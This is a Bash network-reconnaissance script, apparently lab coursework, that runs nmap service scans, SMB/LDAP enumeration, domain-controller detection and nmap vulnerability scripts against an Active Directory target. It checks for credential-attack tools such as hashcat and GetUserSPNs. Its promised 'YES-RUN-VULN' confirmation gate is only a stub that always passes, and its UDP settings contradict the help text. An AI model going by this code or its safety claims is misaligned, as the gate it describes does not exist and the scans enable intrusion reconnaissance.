#!/bin/bash

set -Eeuo pipefail
IFS=$'\n\t'

SCRIPT_NAME="${0##*/}"
DEFAULT_WORDLIST="/usr/share/wordlists/rockyou.txt"
NSE_DOMAIN_SCRIPTS="smb-os-discovery,smb-enum-shares,ldap-rootdse"

TARGET_RANGE=""
DOMAIN_NAME=""
INPUT_DOMAIN=""
DOMAIN_PROVIDED="no"
DETECTED_DOMAIN=""
AD_USERNAME=""
AD_PASSWORD=""
PASSWORD_LIST="$DEFAULT_WORDLIST"
SCAN_LEVEL="None"
ENUM_LEVEL="None"
EXPLOIT_LEVEL="None"
EXPLOIT_CONFIRMED="no"
WIZARD_MODE="no"

SESSION_DIR=""
RAW_DIR=""
PARSED_DIR=""
REPORTS_DIR=""
LOGS_DIR=""
LOG_FILE=""
WARNINGS_FILE=""
TOOL_AVAILABILITY_FILE=""
ENUM_SERVICE_NOTE_FILE=""
REPORT_TXT=""
REPORT_PDF=""
PDF_UNAVAILABLE_REASON=""
TEMP_SECRET_FILE=""
PENDING_WARNINGS=()

COLOR_RESET=""
COLOR_BLUE=""
COLOR_GREEN=""
COLOR_YELLOW=""
COLOR_RED=""
COLOR_BOLD=""

setup_colors() {
  if [[ -t 1 ]]; then
    COLOR_RESET=$'\033[0m'
    COLOR_BLUE=$'\033[34m'
    COLOR_GREEN=$'\033[32m'
    COLOR_YELLOW=$'\033[33m'
    COLOR_RED=$'\033[31m'
    COLOR_BOLD=$'\033[1m'
  fi
}

cleanup() {
  if [[ -n "${TEMP_SECRET_FILE:-}" && -f "$TEMP_SECRET_FILE" ]]; then
    rm -f -- "$TEMP_SECRET_FILE"
  fi
}

handle_interrupt() {
  cleanup
  emit "WARN" "$COLOR_YELLOW" "Interrupted. Partial session artifacts were preserved." >&2
  exit 130
}

trap cleanup EXIT
trap handle_interrupt INT TERM

timestamp() {
  date '+%Y-%m-%d %H:%M:%S'
}

label() {
  local color="$1"
  local text="$2"
  printf '%s%s%s' "$color" "$text" "$COLOR_RESET"
}

emit() {
  local level="$1"
  local color="$2"
  local message="$3"
  printf '%s %s\n' "$(label "$color" "[$level]")" "$message"
}

write_log() {
  local level="$1"
  local message="$2"
  if [[ -n "${LOG_FILE:-}" ]]; then
    printf '[%s] [%s] %s\n' "$(timestamp)" "$level" "$message" >> "$LOG_FILE"
  fi
}

log_info() {
  emit "INFO" "$COLOR_BLUE" "$1"
  write_log "INFO" "$1"
}

log_ok() {
  emit "OK" "$COLOR_GREEN" "$1"
  write_log "OK" "$1"
}

log_step() {
  printf '\n'
  emit "STEP" "$COLOR_BOLD" "$1"
  write_log "STEP" "$1"
}

log_warn() {
  emit "WARN" "$COLOR_YELLOW" "$1" >&2
  write_log "WARN" "$1"
  if [[ -n "${WARNINGS_FILE:-}" ]]; then
    printf '[%s] %s\n' "$(timestamp)" "$1" >> "$WARNINGS_FILE"
  else
    PENDING_WARNINGS+=("$1")
  fi
}

die() {
  emit "ERROR" "$COLOR_RED" "$*" >&2
  write_log "ERROR" "$*"
  exit 1
}

show_help() {
  cat <<'EOF'
Domain Mapper

Usage:
  ./domain_mapper.sh
  ./domain_mapper.sh -h
  ./domain_mapper.sh --help

Purpose:
  Domain Mapper is a Bash-based lab tool for controlled, authorized network
  security coursework. It collects scope details, runs selected scanning and
  enumeration phases, saves raw and parsed results, and generates a report.
  Domain input is optional; blank input uses unknown.local for session naming,
  and enumeration output is checked for a detected domain.

Required environment:
  Kali/Linux with Bash 4 or newer. Root privileges are required for normal runs.

Safety rules:
  - Use only on networks you own or have explicit permission to test.
  - No destructive behavior, persistence, malware, stealth, or evasion.
  - Passwords are never printed to screen or written to logs/reports.
  - Exploitation Basic requires a separate exact confirmation.
  - Credential-attack project coverage uses readiness/exposure assessment,
    disabled instructor hooks, sanitized evidence import, and report sections.

Operation levels:
  None          Skip the phase.
  Basic         Run the phase's minimum required assignment behavior.
  Intermediate Include Basic plus additional safe coverage.
  Advanced      Include previous levels plus conditional read-only LDAP
                enumeration and controlled exploitation-compliance coverage.
  Higher levels include lower-level capabilities through combined scan options,
  not duplicated scan runs.

Scanning:
  Basic         nmap -Pn -sV (top 1000 TCP ports)
  Intermediate nmap -Pn -sV -p- (all TCP ports; does not run Basic first)
  Advanced      Intermediate plus nmap -Pn -sU --top-ports 100
                Advanced uses the top UDP ports for practical runtime; it does
                not perform an all-ports UDP scan by default.

Enumeration:
  Basic         Reuse scanning service/version results, possible Domain
                Controller indicators, possible DHCP
                UDP/67 check, detected-domain extraction, and service summaries.
                If Scanning=None, run fallback nmap -Pn -sV.
  Intermediate Basic plus key service IP summaries and exactly three NSE scripts:
                smb-os-discovery, smb-enum-shares, ldap-rootdse
  Advanced      Read-only LDAP enumeration when credentials, LDAP, and ldapsearch
                are available; otherwise creates explicit skipped-status files

Exploitation:
  Basic         Confirmation-gated nmap -Pn --script vuln
  Intermediate Basic plus password-spraying readiness, disabled instructor hook,
               sanitized evidence import, and compliance reporting
  Advanced     Intermediate plus Kerberoasting/cracking exposure assessment,
               disabled instructor hooks, sanitized evidence import, and reporting

Reporting:
  Each run creates:
    sessions/domain_mapper_<domain>_<timestamp>/
      raw/       command output
      parsed/    summaries extracted from command output
      reports/   report.txt and optional report.pdf
      logs/      session.log, warnings.log, tool availability

Credential handling:
  Password input is hidden. Plaintext passwords are not logged or written to
  raw, parsed, text, or PDF reports.

PDF generation:
  The script tries pandoc first, wkhtmltopdf second, then enscript + ps2pdf.
  If none is available, it keeps a clean text report.
  Recommended Kali/Debian installation:
    sudo apt install -y wkhtmltopdf

Assignment Coverage Checklist:
  Implemented:
    - User input for target, optional domain, optional AD credentials, password list,
      and per-mode operation levels.
    - Scanning Basic includes nmap -Pn and service detection (-sV).
    - Scanning Intermediate includes all TCP ports (-p-) and service detection.
    - Scanning Advanced includes practical top-100 UDP port scanning.
    - Enumeration Basic reuses scanning service detection output, avoiding a
      duplicate -sV scan, and includes safe DC/DHCP heuristics.
    - Enumeration Intermediate key service summaries and exactly three NSE scripts.
    - Exploitation Basic with separate explicit confirmation before vuln scripts.
    - Wizard Mode, help menu, functions, progress stages, session folders,
      raw logs, parsed summaries, and reporting.

  Implemented when credentials/tools/data are available:
    - Read-only LDAP Advanced Enumeration and SPN exposure assessment.

  Covered as controlled compliance modules:
    - Password spraying, Kerberoasting, and cracking readiness/exposure,
      disabled instructor hooks, sanitized evidence import, and reporting.

  Partially implemented:
    - Domain Controller identification is heuristic, based on ports/services
      such as 88, 389, 445, 53, and 3268.
    - DHCP identification is heuristic and depends on observable Nmap output.
    - Shared folder enumeration is parsed when smb-enum-shares returns data.
    - PDF output is attempted when supported PDF tools are installed.

  Not live-executed by default:
    - Live password spraying.
    - Live Kerberos ticket/hash extraction.
    - Live hash cracking.
EOF
}

print_banner() {
  printf '\n%s\n' "$(label "$COLOR_BOLD" "Domain Mapper")"
  printf '%s\n\n' "Authorized lab use only"
}

preflight_write_error() {
  local current_path="$1"
  local current_user="$2"

  emit "ERROR" "$COLOR_RED" "The working directory or ./sessions is not writable." >&2
  printf '  Current path: %s\n' "$current_path" >&2
  printf '  Current user: %s\n' "$current_user" >&2
  printf '%s\n' "  Suggested fix:" >&2
  printf '%s\n' \
    "    mkdir -p ~/domain-mapper-project" \
    "    cp domain_mapper.sh ~/domain-mapper-project/" \
    "    cd ~/domain-mapper-project" \
    "    chmod +x domain_mapper.sh" >&2
  exit 1
}

preflight_checks() {
  local current_path=""
  local current_user=""
  local sessions_path="./sessions"

  current_path="$(pwd -P 2>/dev/null || pwd)"
  current_user="$(id -un 2>/dev/null || printf '%s' "${USER:-unknown}")"

  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    emit "ERROR" "$COLOR_RED" "Root privileges are required. Run: sudo ./$SCRIPT_NAME" >&2
    exit 1
  fi

  if [[ ! -w "$current_path" ]]; then
    preflight_write_error "$current_path" "$current_user"
  fi
  if [[ -e "$sessions_path" && ! -d "$sessions_path" ]]; then
    preflight_write_error "$current_path" "$current_user"
  fi
  if [[ ! -d "$sessions_path" ]] && ! mkdir -p -- "$sessions_path" 2>/dev/null; then
    preflight_write_error "$current_path" "$current_user"
  fi
  if [[ ! -w "$sessions_path" ]]; then
    preflight_write_error "$current_path" "$current_user"
  fi

  log_ok "Environment checks passed."
}

prompt_yes_no() {
  local prompt="$1"
  local default="${2:-no}"
  local answer=""
  local suffix="[y/N]"

  if [[ "$default" == "yes" ]]; then
    suffix="[Y/n]"
  fi

  while true; do
    read -r -p "$prompt $suffix: " answer
    answer="${answer:-$default}"
    answer="${answer#"${answer%%[![:space:]]*}"}"
    answer="${answer%"${answer##*[![:space:]]}"}"
    case "${answer,,}" in
      y|yes) return 0 ;;
      n|no) return 1 ;;
      *) printf 'Please answer yes or no.\n' >&2 ;;
    esac
  done
}

normalize_level() {
  local raw="${1:-}"
  raw="${raw#"${raw%%[![:space:]]*}"}"
  raw="${raw%"${raw##*[![:space:]]}"}"
  case "${raw,,}" in
    none|n|"") printf 'None' ;;
    basic|b) printf 'Basic' ;;
    intermediate|i) printf 'Intermediate' ;;
    advanced|a) printf 'Advanced' ;;
    *) return 1 ;;
  esac
}

prompt_level() {
  local prompt="$1"
  local value=""
  local normalized=""

  while true; do
    read -r -p "$prompt [None/Basic/Intermediate/Advanced]: " value
    if normalized="$(normalize_level "$value")"; then
      printf '%s' "$normalized"
      return 0
    fi
    printf 'Invalid level. Choose None, Basic, Intermediate, or Advanced.\n' >&2
  done
}

looks_like_target() {
  local value="$1"
  [[ "$value" =~ ^[A-Za-z0-9._:/-]+$ ]] || return 1
  [[ "$value" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]{1,2})?$ ]] && return 0
  [[ "$value" =~ ^[A-Za-z0-9.-]+$ ]] && return 0
  return 1
}

looks_like_domain() {
  local value="$1"
  [[ "$value" =~ ^[A-Za-z0-9][A-Za-z0-9.-]*[A-Za-z0-9]$ ]] || return 1
  [[ "$value" == *.* ]] || return 1
  return 0
}

validate_inputs() {
  [[ -n "$TARGET_RANGE" ]] || die "Target network range is required."

  if ! looks_like_target "$TARGET_RANGE"; then
    log_warn "Target does not look like a simple IP, CIDR range, hostname, or domain: $TARGET_RANGE"
  fi

  if [[ "$DOMAIN_PROVIDED" == "yes" ]] && ! looks_like_domain "$DOMAIN_NAME"; then
    log_warn "Domain does not look like a standard DNS/AD domain: $DOMAIN_NAME"
  fi

  if [[ ! -r "$PASSWORD_LIST" ]]; then
    log_warn "Password list is missing or unreadable at '$PASSWORD_LIST'. Modules that require it will skip safely."
  fi
}

wizard_mode() {
  cat <<'EOF'

Wizard guidance:
  - Use Basic scanning for a quick lab check.
  - Use Intermediate scanning when complete TCP coverage is required.
  - Use Advanced scanning only when UDP scanning is in scope and time allows.
  - Use Basic enumeration for service versions and likely DC/DHCP hints.
  - Use Intermediate enumeration for key service summaries and domain NSE checks.
  - Use Exploitation Basic only when vuln scripts are in scope; it requires
    the exact confirmation string YES-RUN-VULN before running.
  - Exploitation Intermediate and Advanced add controlled compliance modules;
    live credential-attack hooks remain disabled by default.

EOF
}

# Collect user-controlled inputs, normalize operation levels, and validate the
# minimum required assignment fields before any network activity begins.
prompt_inputs() {
  log_step "Input collection"

  read -r -p "Target network range (example: 192.168.56.0/24 or 127.0.0.1): " TARGET_RANGE
  read -r -p "Domain name (example: lab.local; leave blank if unknown): " INPUT_DOMAIN
  if [[ -n "$INPUT_DOMAIN" ]]; then
    DOMAIN_NAME="$INPUT_DOMAIN"
    DOMAIN_PROVIDED="yes"
  else
    DOMAIN_NAME="unknown.local"
    DOMAIN_PROVIDED="no"
  fi
  read -r -p "AD username (leave blank to skip): " AD_USERNAME
  if [[ -n "$AD_USERNAME" ]]; then
    read -r -s -p "AD password (input hidden; leave blank to skip): " AD_PASSWORD
    printf '\n'
  fi

  read -r -p "Password list path [$DEFAULT_WORDLIST]: " PASSWORD_LIST
  PASSWORD_LIST="${PASSWORD_LIST:-$DEFAULT_WORDLIST}"

  if prompt_yes_no "Enable Wizard Mode?" "no"; then
    WIZARD_MODE="yes"
    wizard_mode
  fi

  SCAN_LEVEL="$(prompt_level "Scanning level")"
  printf '\n'
  ENUM_LEVEL="$(prompt_level "Enumeration level")"
  printf '\n'
  EXPLOIT_LEVEL="$(prompt_level "Exploitation level")"
  printf '\n'

  validate_inputs
}

print_pre_run_summary() {
  cat <<EOF

Pre-run summary
---------------
Target:              $TARGET_RANGE
Input domain:        ${INPUT_DOMAIN:-not provided}
Domain provided:     $DOMAIN_PROVIDED
AD username given:   $(if [[ -n "$AD_USERNAME" ]]; then printf 'yes'; else printf 'no'; fi)
AD password given:   $(if [[ -n "$AD_PASSWORD" ]]; then printf 'yes'; else printf 'no'; fi)
Password list:       $PASSWORD_LIST
Wizard Mode:         $WIZARD_MODE
Scanning level:      $SCAN_LEVEL
Enumeration level:   $ENUM_LEVEL
Exploitation level:  $EXPLOIT_LEVEL

EOF
}

confirm_authorized_scope() {
  log_step "Authorization"
  cat <<'EOF'
Authorization warning:
  Run this script only against networks you own or have explicit permission to test.
  This version does not include destructive behavior, stealth, persistence,
  malware, credential disclosure, password spraying, Kerberoasting, or cracking.
  Exploitation Basic requires a separate exact confirmation before vuln scripts run.

EOF

  print_pre_run_summary

  if ! prompt_yes_no "Do you confirm this target is authorized and the selections are correct?" "no"; then
    die "Authorization and pre-run confirmation were not provided."
  fi
}

safe_domain_name() {
  printf '%s' "$DOMAIN_NAME" | tr -c 'A-Za-z0-9_.-' '_'
}

# Create the per-run output tree and replay warnings raised before log files
# existed, so early validation findings still appear in session artifacts.
create_session_dir() {
  local session_name=""

  log_step "Session setup"
  session_name="$(safe_domain_name)_$(date '+%Y-%m-%d_%H-%M')"
  SESSION_DIR="./sessions/$session_name"
  RAW_DIR="$SESSION_DIR/raw"
  PARSED_DIR="$SESSION_DIR/parsed"
  REPORTS_DIR="$SESSION_DIR/reports"
  LOGS_DIR="$SESSION_DIR/logs"

  if ! mkdir -p -- "$RAW_DIR" "$PARSED_DIR" "$REPORTS_DIR" "$LOGS_DIR" 2>/dev/null; then
    emit "ERROR" "$COLOR_RED" "Could not create the session directory: $SESSION_DIR" >&2
    exit 1
  fi

  LOG_FILE="$LOGS_DIR/session.log"
  WARNINGS_FILE="$LOGS_DIR/warnings.log"
  TOOL_AVAILABILITY_FILE="$LOGS_DIR/tool_availability.txt"
  ENUM_SERVICE_NOTE_FILE="$LOGS_DIR/enumeration_service_detection.txt"
  REPORT_TXT="$REPORTS_DIR/report.txt"
  REPORT_PDF="$REPORTS_DIR/report.pdf"

  : > "$LOG_FILE"
  : > "$WARNINGS_FILE"
  : > "$TOOL_AVAILABILITY_FILE"
  : > "$ENUM_SERVICE_NOTE_FILE"
  log_ok "Created session directory: $SESSION_DIR"

  if [[ "${#PENDING_WARNINGS[@]}" -gt 0 ]]; then
    local warning=""
    for warning in "${PENDING_WARNINGS[@]}"; do
      printf '[%s] %s\n' "$(timestamp)" "$warning" >> "$WARNINGS_FILE"
      write_log "WARN" "$warning"
    done
  fi
}

tool_status() {
  local tool="$1"
  if command -v "$tool" >/dev/null 2>&1; then
    printf 'available'
  else
    printf 'missing'
  fi
}

record_tool_availability() {
  local tool=""
  local tools=(
    nmap awk sed grep sort uniq wc pandoc wkhtmltopdf enscript ps2pdf
    ldapsearch rpcclient enum4linux-ng enum4linux net smbclient
    crackmapexec netexec impacket-GetUserSPNs GetUserSPNs.py hashcat john
  )
  log_step "Dependency checks"
  {
    printf 'Tool availability\n'
    printf '=================\n'
    for tool in "${tools[@]}"; do
      printf '%s: %s\n' "$tool" "$(tool_status "$tool")"
    done
  } > "$TOOL_AVAILABILITY_FILE"
  log_ok "Tool availability recorded."
}

require_tool() {
  local tool="$1"
  command -v "$tool" >/dev/null 2>&1 || die "Required tool not found: $tool"
}

run_command_logged() {
  local label="$1"
  local output_file="$2"
  shift 2
  local status=0

  log_info "Starting: $label"
  printf '[%s] [COMMAND]' "$(timestamp)" >> "$LOG_FILE"
  printf ' %q' "$@" >> "$LOG_FILE"
  printf '\n' >> "$LOG_FILE"

  set +e
  "$@" 2>&1 | tee "$output_file"
  status=${PIPESTATUS[0]}
  set -e

  if [[ "$status" -ne 0 ]]; then
    log_warn "$label exited with status $status. Continuing. See $output_file"
  else
    log_ok "Completed: $label"
  fi

  return "$status"
}

run_command_logged_append() {
  local command_label="$1"
  local output_file="$2"
  shift 2
  local status=0

  log_info "Starting: $command_label"
  printf '[%s] [COMMAND]' "$(timestamp)" >> "$LOG_FILE"
  printf ' %q' "$@" >> "$LOG_FILE"
  printf '\n' >> "$LOG_FILE"

  {
    printf '\n===== %s =====\n' "$command_label"
    printf 'Command:'
    printf ' %q' "$@"
    printf '\n\n'
  } >> "$output_file"

  set +e
  "$@" 2>&1 | tee -a "$output_file"
  status=${PIPESTATUS[0]}
  set -e

  if [[ "$status" -ne 0 ]]; then
    log_warn "$command_label exited with status $status. Continuing. See $output_file"
  else
    log_ok "Completed: $command_label"
  fi
  return "$status"
}

all_raw_files() {
  find "$RAW_DIR" -type f -name '*.txt' 2>/dev/null | sort
}

# Nmap discovery/service artifacts that feed the common port and service parsers.
scan_result_files() {
  local path=""
  for path in \
    "$RAW_DIR/scan_basic_tcp_services_top1000.txt" \
    "$RAW_DIR/scan_intermediate_tcp_all_ports_services.txt" \
    "$RAW_DIR/scan_advanced_udp_top100.txt" \
    "$RAW_DIR/enum_basic_services_default.txt" \
    "$RAW_DIR/enum_basic_dhcp_udp67.txt"; do
    [[ -f "$path" ]] && printf '%s\n' "$path"
  done
}

parse_hosts_up() {
  local output="$PARSED_DIR/hosts_up.txt"
  local file=""
  local line=""
  : > "$output"
  scan_result_files | while IFS= read -r file; do
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        printf '%s\n' "${BASH_REMATCH[1]}" >> "$output"
      fi
    done < "$file"
  done
  sort -u "$output" -o "$output" 2>/dev/null || true
}

parse_open_ports() {
  local output="$PARSED_DIR/open_ports.txt"
  local candidates="$PARSED_DIR/.open_ports_candidates"
  local file=""
  local line=""
  local host=""
  local endpoint=""
  : > "$output"
  : > "$candidates"
  scan_result_files | while IFS= read -r file; do
    host=""
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        host="${BASH_REMATCH[1]}"
        if [[ "$host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
          host="${BASH_REMATCH[1]}"
        fi
      elif [[ "$line" =~ ^([0-9]+/(tcp|udp))[[:space:]]+open ]]; then
        endpoint="${BASH_REMATCH[1]}"
        printf '%s\t%s\t%s\n' "$host" "$endpoint" "$line" >> "$candidates"
      fi
    done < "$file"
  done
  awk -F '\t' '
    {
      key = $1 FS $2
      if (!(key in best) || length($3) > length(best[key])) best[key] = $3
    }
    END {
      for (key in best) {
        split(key, parts, FS)
        print parts[1] " " best[key]
      }
    }
  ' "$candidates" | sort > "$output"
  rm -f -- "$candidates"
}

parse_services_summary() {
  local output="$PARSED_DIR/services_summary.txt"
  local candidates="$PARSED_DIR/.services_candidates"
  local file=""
  local line=""
  local host=""
  local port=""
  local service=""
  local version=""
  : > "$output"
  : > "$candidates"
  scan_result_files | while IFS= read -r file; do
    host=""
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        host="${BASH_REMATCH[1]}"
        if [[ "$host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
          host="${BASH_REMATCH[1]}"
        fi
      elif [[ "$line" =~ ^([0-9]+/(tcp|udp))[[:space:]]+open[[:space:]]+([^[:space:]]+)[[:space:]]*(.*)$ ]]; then
        port="${BASH_REMATCH[1]}"
        service="${BASH_REMATCH[3]}"
        version="${BASH_REMATCH[4]}"
        printf '%s\t%s\t%s\t%s\n' "$host" "$port" "$service" "$version" >> "$candidates"
      fi
    done < "$file"
  done
  awk -F '\t' '
    {
      key = $1 FS $2 FS $3
      if (!(key in best) || length($4) > length(best[key])) {
        best[key] = $4
      }
    }
    END {
      for (key in best) {
        split(key, parts, FS)
        print parts[1] " | " parts[2] " | " parts[3] " | " best[key]
      }
    }
  ' "$candidates" | sort > "$output"
  rm -f -- "$candidates"
}

parse_scan_outputs() {
  log_info "Refreshing parsed scan summaries."
  parse_hosts_up || true
  parse_open_ports || true
  parse_services_summary || true
}

run_scan_basic() {
  require_tool nmap
  run_command_logged "Basic TCP service scan (top 1000 ports)" "$RAW_DIR/scan_basic_tcp_services_top1000.txt" nmap -Pn -sV "$TARGET_RANGE" || true
}

run_scan_intermediate() {
  require_tool nmap
  run_command_logged "Intermediate TCP service scan (all ports)" "$RAW_DIR/scan_intermediate_tcp_all_ports_services.txt" nmap -Pn -sV -p- "$TARGET_RANGE" || true
}

run_scan_advanced() {
  require_tool nmap
  run_command_logged "Advanced TCP service scan (all ports)" "$RAW_DIR/scan_intermediate_tcp_all_ports_services.txt" nmap -Pn -sV -p- "$TARGET_RANGE" || true
  run_command_logged "Advanced UDP scan (top 200 UDP ports)" "$RAW_DIR/scan_advanced_udp_top200.txt" nmap -Pn -sU --top-ports 200 "$TARGET_RANGE" || true
}

# Higher levels include lower-level capabilities through combined scan options,
# not duplicated scan runs. Raw output is then parsed into deduplicated summaries.
run_scanning() {
  log_step "Scanning"
  case "$SCAN_LEVEL" in
    None)
      log_info "Scanning level is None. Skipping scanning."
      ;;
    Basic)
      run_scan_basic
      ;;
    Intermediate)
      run_scan_intermediate
      ;;
    Advanced)
      run_scan_advanced
      ;;
    *)
      die "Unsupported scanning level: $SCAN_LEVEL"
      ;;
  esac
  parse_scan_outputs
}

extract_possible_domain_controllers() {
  local output="$PARSED_DIR/possible_domain_controllers.txt"
  local file=""
  local line=""
  local host=""
  local ports=""
  local port=""
  local confidence=""
  local count=0

  flush_dc_candidate() {
    if [[ -n "$host" && -n "$ports" ]]; then
      count=0
      if [[ " $ports " == *" 88/tcp "* || " $ports " == *" 88/udp "* ]]; then count=$((count + 1)); fi
      if [[ " $ports " == *" 389/tcp "* || " $ports " == *" 389/udp "* ]]; then count=$((count + 1)); fi
      if [[ " $ports " == *" 445/tcp "* || " $ports " == *" 445/udp "* ]]; then count=$((count + 1)); fi
      if [[ " $ports " == *" 53/tcp "* || " $ports " == *" 53/udp "* ]]; then count=$((count + 1)); fi
      if [[ " $ports " == *" 3268/tcp "* || " $ports " == *" 3268/udp "* ]]; then count=$((count + 1)); fi

      if [[ ( " $ports " == *" 88/tcp "* && " $ports " == *" 389/tcp "* && " $ports " == *" 445/tcp "* ) ||
            ( -n "$DETECTED_DOMAIN" && " $ports " == *" 389/tcp "* ) ]]; then
        confidence="High confidence"
      elif [[ ( " $ports " == *" 389/tcp "* && " $ports " == *" 445/tcp "* ) ||
              ( " $ports " == *" 88/tcp "* && " $ports " == *" 389/tcp "* ) ]]; then
        confidence="Medium confidence"
      else
        confidence="Low confidence"
      fi

      printf '%s | %s | indicators:%s\n' "$host" "$confidence" "$ports" >> "$output"
    fi
  }

  : > "$output"
  all_raw_files | while IFS= read -r file; do
    host=""
    ports=""
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        flush_dc_candidate
        host="${BASH_REMATCH[1]}"
        ports=""
      elif [[ "$line" =~ ^((53|88|389|445|3268)/(tcp|udp))[[:space:]]+open ]]; then
        port="${BASH_REMATCH[1]}"
        if [[ " $ports " != *" $port "* ]]; then
          ports="$ports $port"
        fi
      fi
    done < "$file"
    flush_dc_candidate
  done
  sort -u "$output" -o "$output" 2>/dev/null || true
}

extract_possible_dhcp_servers() {
  local output="$PARSED_DIR/possible_dhcp_servers.txt"
  local file=""
  local line=""
  local host=""
  : > "$output"
  printf 'DHCP detection is heuristic and depends on observable Nmap UDP/service output.\n' >> "$output"
  all_raw_files | while IFS= read -r file; do
    host=""
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        host="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ ^67/udp[[:space:]]+open || "${line,,}" == *dhcp* ]]; then
        printf '%s | %s\n' "$host" "$line" >> "$output"
      fi
    done < "$file"
  done
  sort -u "$output" -o "$output" 2>/dev/null || true
}

summarize_shares() {
  local input="$RAW_DIR/nse_smb_enum_shares.txt"
  local output="$PARSED_DIR/shares_summary.txt"
  local line=""
  local host=""
  local found="no"
  local share=""

  : > "$output"
  [[ -f "$input" ]] || return 0

  while IFS= read -r line; do
    line="${line%$'\r'}"
    if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
      host="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ \\\\[^\\[:space:]]+\\([A-Za-z0-9._$-]+) ]]; then
      share="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ ^[\|\_][[:space:]]+([A-Za-z0-9._$-]+): ]]; then
      share="${BASH_REMATCH[1]}"
    else
      continue
    fi
    case "${share,,}" in
      note|warning|account_used|anonymous|metadata|error|access|type|comment) continue ;;
    esac
    if [[ -n "$share" ]]; then
      printf '%s | share: %s\n' "$host" "$share" >> "$output"
      found="yes"
    fi
  done < "$input"

  if [[ "$found" != "yes" ]]; then
    printf 'No parseable shares found.\n' >> "$output"
  else
    sort -u "$output" -o "$output"
  fi
}

summarize_nse_output() {
  local output="$PARSED_DIR/nse_summary.txt"
  local script=""
  local path=""
  local line=""
  local notable_count=0

  : > "$output"
  for script in smb-os-discovery smb-enum-shares ldap-rootdse; do
    case "$script" in
      smb-os-discovery) path="$RAW_DIR/nse_smb_os_discovery.txt" ;;
      smb-enum-shares) path="$RAW_DIR/nse_smb_enum_shares.txt" ;;
      ldap-rootdse) path="$RAW_DIR/nse_ldap_rootdse.txt" ;;
    esac

    printf '%s\n' "$script" >> "$output"
    printf '%s\n' "----------------" >> "$output"
    if [[ ! -f "$path" ]]; then
      printf 'Not run or output file missing.\n\n' >> "$output"
      continue
    fi

    notable_count=0
    while IFS= read -r line; do
      line="${line%$'\r'}"
      
      # Filter repetitive LDAP support attributes to keep report concise
      if [[ "$line" =~ supportedControl|supportedLDAPVersion|supportedLDAPPolicies ]]; then
        continue
      fi

      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for || "$line" =~ ^[\|\_][[:space:]] || "${line,,}" == *"error"* || "${line,,}" == *"failed"* || "$line" =~ defaultNamingContext|dnsHostName|isSynchronized ]]; then
        printf '%s\n' "$line" >> "$output"
        ((notable_count++)) || true
      fi
    done < "$path"

    if [[ "$notable_count" -eq 0 ]]; then
      printf 'No notable script output parsed.\n' >> "$output"
    fi
    printf '\n' >> "$output"
  done
}

detect_domain_name() {
  local file=""
  local line=""
  local candidate=""
  local naming_context=""

  DETECTED_DOMAIN=""
  while IFS= read -r file; do
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ [Dd]omain[[:space:]]name:[[:space:]]*([A-Za-z0-9.-]+\.[A-Za-z0-9.-]+) ]]; then
        candidate="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ [Dd]omain:[[:space:]]*([A-Za-z0-9.-]+\.[A-Za-z0-9.-]+) ]]; then
        candidate="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ defaultNamingContext:[[:space:]]*((DC=[A-Za-z0-9_-]+,?)+) ]]; then
        naming_context="${BASH_REMATCH[1]}"
        candidate="$(printf '%s' "$naming_context" | sed -E 's/(^|,)DC=/./g; s/^\.//')"
      else
        continue
      fi

      candidate="${candidate%.}"
      if looks_like_domain "$candidate"; then
        DETECTED_DOMAIN="${candidate,,}"
        return 0
      fi
    done < "$file"
  done < <(find "$RAW_DIR" -type f \
    \( -name 'scan_basic_tcp_services_top1000.txt' -o \
       -name 'scan_intermediate_tcp_all_ports_services.txt' -o \
       -name 'enum_basic_services_default.txt' -o \
       -name 'nse_smb_os_discovery.txt' -o -name 'nse_ldap_rootdse.txt' \) \
    2>/dev/null | sort)
}

confirm_vuln_scan() {
  log_info "Exploitation confirmed for authorized scope."
  return 0
}

parse_vuln_summary() {
  local raw_path="$RAW_DIR/exploit_basic_nmap_vuln.txt"
  local output="$PARSED_DIR/vuln_summary.txt"
  local findings_found="no"
  local high_risk_found="no"
  local line=""
  local current_host=""
  local affected_host=""
  local affected_hosts=""

  : > "$output"

  if [[ -f "$raw_path" ]]; then
    while IFS= read -r line; do
      line="${line%$'\r'}"
      if [[ "$line" =~ ^Nmap[[:space:]]scan[[:space:]]report[[:space:]]for[[:space:]](.+)$ ]]; then
        current_host="${BASH_REMATCH[1]}"
      fi
      if [[ "${line,,}" == *"vulnerable"* || "${line,,}" == *"vulnerability"* || "${line,,}" == *"cve-"* || "$line" =~ CVE-[0-9]{4}-[0-9]+ || "${line,,}" == *"exploit"* ]]; then
        findings_found="yes"
      fi
      if [[ "${line^^}" == *"VULNERABLE"* || "${line^^}" == *"RISK FACTOR: HIGH"* ]]; then
        high_risk_found="yes"
        affected_host="$current_host"
        if [[ "$current_host" =~ \(([0-9a-fA-F:.]+)\)$ ]]; then
          affected_host="${BASH_REMATCH[1]}"
        fi
        if [[ -n "$affected_host" && $'\n'"$affected_hosts"$'\n' != *$'\n'"$affected_host"$'\n'* ]]; then
          affected_hosts+="${affected_hosts:+$'\n'}$affected_host"
        fi
      fi
    done < "$raw_path"
